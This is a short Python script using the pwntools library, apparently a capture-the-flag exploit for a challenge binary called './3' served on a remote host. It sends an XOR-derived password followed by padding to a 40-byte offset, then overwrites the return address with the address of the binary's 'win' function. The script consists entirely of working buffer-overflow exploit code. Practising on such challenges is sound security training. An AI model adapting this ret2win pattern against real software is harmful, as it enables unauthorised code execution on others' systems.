from pwn import *

# p = process("./3")
p = remote("rev.danissimurr.ru", 5225)
elf = ELF("./3")

offset = 32 + 8

password = bytes([
    0x32 ^ 0x32,
    0x35 ^ 0x42,
    0x2c ^ 0x52,
    0x63 ^ 0x62
])

payload = password
payload += b"A" * (offset - len(payload))
payload += p64(elf.symbols["win"])

p.sendlineafter(b"Enter password: ", payload)

print(p.recvall().decode())